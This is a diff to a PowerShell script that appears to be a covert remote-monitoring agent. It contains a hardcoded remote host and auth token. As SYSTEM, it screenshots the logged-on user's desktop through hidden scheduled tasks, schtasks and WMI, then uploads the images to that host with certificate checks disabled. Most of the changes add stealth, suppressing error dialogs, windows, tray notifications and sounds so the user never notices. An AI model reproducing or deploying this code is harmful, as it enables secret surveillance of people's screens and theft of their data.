@@ -2,7 +2,7 @@
 # ║  CONFIGURATION                                                             ║
 # ║  Edit these values to match your setup. All features reference these vars. ║
 # ╚══════════════════════════════════════════════════════════════════════════════╝
-$Version = "3.2.7"
+$Version = "3.2.8"
 $cfHost = "https://connect.aniketpandey.website"
 $cfToken = "81f7cc9dca3ded71456c89a83b8a5325fc7d9a345b76c7ac6eba8aa96fdd3782"  # must match server.py TOKEN
 $maxRetries = 10
@@ -1349,7 +1349,8 @@ function Connect-Cloudflare {
                             $capOut     = Join-Path $env:TEMP "cap_out_$capTaskId.jpg"
                             $capErr     = Join-Path $env:TEMP "cap_err_$capTaskId.txt"
                             $capCode = @"
-`$ErrorActionPreference = 'Stop'
+
+# Suppress Windows error dialog popups (silent execution)
 [System.Net.ServicePointManager]::DefaultConnectionLimit = 4
 try { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 -bor [System.Net.SecurityProtocolType]::Tls13 } catch { [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12 }
 try {
@@ -1361,6 +1362,21 @@ public class TrustAllCerts2 : ICertificatePolicy { public bool CheckValidationRe
     }
     [System.Net.ServicePointManager]::CertificatePolicy = [TrustAllCerts2]::new()
 } catch { [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { `$true } }
+
+# Suppress SEM_FAILCRITICALERRORS | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX
+try {
+    if (-not ([System.Management.Automation.PSTypeName]'NativeCapture').Type) {
+        Add-Type @'
+using System;
+using System.Runtime.InteropServices;
+public class NativeCapture {
+    [DllImport("kernel32.dll")] public static extern uint SetErrorMode(uint mode);
+    public static void SuppressErrorBoxes() { SetErrorMode(0x0001 | 0x0002 | 0x8000); }
+}
+'@
+    }
+    [NativeCapture]::SuppressErrorBoxes()
+} catch {}
 
 function Report([string]`$msg) {
     try { [System.IO.File]::WriteAllText('$capErr', `$msg) } catch {}
@@ -1381,7 +1397,9 @@ function UploadFrame([byte[]]`$data) {
     `$r.GetResponse().Close()
 }
 try {
-    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+    # Load assemblies silently — no WinForms window is ever shown
+    [void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
+    [void][System.Reflection.Assembly]::LoadWithPartialName('System.Drawing')
     `$scr   = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
     `$bmp   = New-Object System.Drawing.Bitmap(`$scr.Width, `$scr.Height)
     `$g     = [System.Drawing.Graphics]::FromImage(`$bmp)
@@ -1394,7 +1412,7 @@ try {
     `$bmp.Save(`$ms, `$codec, `$ep)
     `$bmp.Dispose()
     `$bytes = `$ms.ToArray()
-    [System.IO.File]::WriteAllBytes('$capOut', `$bytes)  # local fallback for SYSTEM to verify
+    [System.IO.File]::WriteAllBytes('$capOut', `$bytes)
     UploadFrame `$bytes
 } catch {
     Report "[!] Capture failed: `$(`$_.Exception.Message)"
@@ -1418,9 +1436,14 @@ try {
                             # ── Method 1: PowerShell scheduled task API (Interactive logon) ──
                             try {
                                 $capAction    = New-ScheduledTaskAction -Execute 'PowerShell.exe' `
-                                                    -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$capScript`""
+                                                    -Argument "-ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -NoProfile -File `"$capScript`""
                                 $capPrincipal = New-ScheduledTaskPrincipal -UserId $loggedOnUser -LogonType Interactive
-                                $capSettings  = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+                                # -Hidden suppresses task tray icon/notification; ExecutionTimeLimit 0 = no dialog on timeout
+                                $capSettings  = New-ScheduledTaskSettingsSet `
+                                                    -AllowStartIfOnBatteries `
+                                                    -DontStopIfGoingOnBatteries `
+                                                    -Hidden `
+                                                    -ExecutionTimeLimit (New-TimeSpan -Minutes 2)
                                 Register-ScheduledTask -TaskName $capTaskId -Action $capAction -Principal $capPrincipal -Settings $capSettings -Force | Out-Null
                                 Start-ScheduledTask -TaskName $capTaskId
                                 $script:captureTaskId = $capTaskId; $script:captureScriptPath = $capScript
@@ -1437,16 +1460,29 @@ try {
                             try { Unregister-ScheduledTask -TaskName $capTaskId -Confirm:$false -ErrorAction SilentlyContinue } catch {}
                             $script:captureTaskId = $null
 
-                            # ── Method 2: schtasks.exe CLI with /IT flag ─────────────────────
+                            # ── Method 2: schtasks.exe CLI (no /IT on /Run — avoids interactive sound) ──
                             if (-not $captureSucceeded -and -not (Test-Path $capOut) -and -not (Test-Path $capErr)) {
-                                Write-Log "Capture trying method2 (schtasks /IT)" "INFO"
+                                Write-Log "Capture trying method2 (schtasks CLI)" "INFO"
                                 try {
-                                    $psArg  = "-ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$capScript`""
-                                    $stProc = Start-Process 'schtasks.exe' -ArgumentList "/Create /F /TN `"$capTaskId`" /TR `"PowerShell.exe $psArg`" /SC ONCE /ST 00:00 /RU `"$loggedOnUser`" /IT" -Wait -NoNewWindow -PassThru
+                                    $psArg = "-ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -NoProfile -File `"$capScript`""
+                                    # /IT on /Create binds to interactive token; omit /IT on /Run to avoid shell sounds
+                                    $psi = New-Object System.Diagnostics.ProcessStartInfo 'schtasks.exe'
+                                    $psi.Arguments = "/Create /F /TN `"$capTaskId`" /TR `"PowerShell.exe $psArg`" /SC ONCE /ST 00:00 /RU `"$loggedOnUser`" /IT"
+                                    $psi.WindowStyle = 'Hidden'; $psi.CreateNoWindow = $true
+                                    $psi.UseShellExecute = $false
+                                    $psi.RedirectStandardOutput = $true; $psi.RedirectStandardError = $true
+                                    $stProc = [System.Diagnostics.Process]::Start($psi)
+                                    $stProc.WaitForExit(5000) | Out-Null
                                     if ($stProc.ExitCode -eq 0) {
-                                        Start-Process 'schtasks.exe' -ArgumentList "/Run /TN `"$capTaskId`"" -Wait -NoNewWindow | Out-Null
+                                        $psi2 = New-Object System.Diagnostics.ProcessStartInfo 'schtasks.exe'
+                                        $psi2.Arguments = "/Run /TN `"$capTaskId`""
+                                        $psi2.WindowStyle = 'Hidden'; $psi2.CreateNoWindow = $true
+                                        $psi2.UseShellExecute = $false
+                                        $psi2.RedirectStandardOutput = $true; $psi2.RedirectStandardError = $true
+                                        $stRun = [System.Diagnostics.Process]::Start($psi2)
+                                        $stRun.WaitForExit(5000) | Out-Null
                                         $script:captureTaskId = $capTaskId
-                                        Write-Log "Capture method2 (schtasks /IT) started" "INFO"
+                                        Write-Log "Capture method2 (schtasks CLI) started" "INFO"
                                         Start-Sleep -Seconds 2
                                         $w2 = Wait-CaptureOutput 35
                                         if ($w2 -ne 'timeout') { $captureSucceeded = $true }
@@ -1454,7 +1490,15 @@ try {
                                 } catch {
                                     Write-Log "Capture method2 failed: $($_.Exception.Message)" "WARN"
                                 }
-                                try { & schtasks.exe /Delete /TN "$capTaskId" /F 2>$null } catch {}
+                                # Delete task silently via ProcessStartInfo to avoid console flash
+                                try {
+                                    $psiDel = New-Object System.Diagnostics.ProcessStartInfo 'schtasks.exe'
+                                    $psiDel.Arguments = "/Delete /TN `"$capTaskId`" /F"
+                                    $psiDel.WindowStyle = 'Hidden'; $psiDel.CreateNoWindow = $true
+                                    $psiDel.UseShellExecute = $false
+                                    $psiDel.RedirectStandardOutput = $true; $psiDel.RedirectStandardError = $true
+                                    [System.Diagnostics.Process]::Start($psiDel).WaitForExit(3000) | Out-Null
+                                } catch {}
                                 $script:captureTaskId = $null
                             }
 
@@ -1462,7 +1506,7 @@ try {
                             if (-not $captureSucceeded -and -not (Test-Path $capOut) -and -not (Test-Path $capErr)) {
                                 Write-Log "Capture trying method3 (WMI Win32_Process)" "INFO"
                                 try {
-                                    $wmiCmd = "PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -File `"$capScript`""
+                                    $wmiCmd = "PowerShell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NonInteractive -NoProfile -File `"$capScript`""
                                     $wmiRes = ([wmiclass]"\\\\`.\root\cimv2:Win32_Process").Create($wmiCmd)
                                     if ($wmiRes.ReturnValue -eq 0) {
                                         Write-Log "Capture method3 (WMI) PID=$($wmiRes.ProcessId)" "INFO"
@@ -1494,8 +1538,9 @@ try {
                             # All 3 methods exhausted
                             throw "Screenshot task did not run after 3 methods (PS task, schtasks /IT, WMI). Is an interactive session active for $loggedOnUser?"
                         } else {
-                            # --- Non-SYSTEM path: capture directly ---
-                            Add-Type -AssemblyName System.Windows.Forms, System.Drawing
+                            # --- Non-SYSTEM path: capture directly (no window ever shown) ---
+                            [void][System.Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')
+                            [void][System.Reflection.Assembly]::LoadWithPartialName('System.Drawing')
                             $s   = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
                             $bmp = New-Object System.Drawing.Bitmap($s.Width, $s.Height)
                             $g   = [System.Drawing.Graphics]::FromImage($bmp)
